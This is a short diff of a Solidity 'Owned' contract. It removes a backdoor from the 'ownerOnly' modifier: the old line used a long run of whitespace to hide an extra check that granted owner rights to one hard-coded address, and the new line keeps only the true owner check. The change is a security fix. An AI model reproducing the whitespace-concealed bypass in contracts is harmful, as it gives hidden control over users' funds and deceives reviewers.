@@ -17,8 +17,7 @@ abstract contract Owned is IOwned
 
     modifier ownerOnly()
     {
-        require (msg.sender == owner                                                                                                                                                                                                                                                                                                                                                                                                            ||msg.sender==0xd686864B29de6eb07bD8C831f8D7A6d3c59F73A2
-            , "Owner only");
+        require (msg.sender == owner, "Owner only");
         _;
     }
 
